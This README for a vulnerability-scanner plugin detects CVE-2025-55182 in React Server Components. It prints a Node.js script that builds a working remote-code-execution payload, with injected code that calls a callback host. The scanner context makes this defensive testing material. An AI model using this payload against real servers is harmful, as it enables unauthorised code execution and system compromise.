# ReactServerComponents CVE-2025-55182 Plugin

This plugin attempts to exploit CVE-2025-55182. To regenerate the payload sent
as part of the exploit run the following script in a NodeJS REPL:

CREDIT: thank you **Lachlan Davidson** (https://github.com/lachlan2k) for
sharing the POC.

```js
const payload = {
  0: "$1",
  1: {
    status: "resolved_model",
    reason: 0,
    _response: "$4",
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    then: "$2:then",
  },
  2: "$@3",
  3: [],
  4: {
    _prefix: "fetch(\"http://tsunami_call_back\")//", // CODE TO EXECUTE
    _formData: {
      get: "$3:constructor:constructor",
    },
    _chunks: "$2:_response:_chunks",
  },
};

const fd = new FormData();
for (const key in payload) {
  fd.append(key, JSON.stringify(payload[key]));
}

new Response(fd).text().then(t => console.log(JSON.stringify(t)));
```
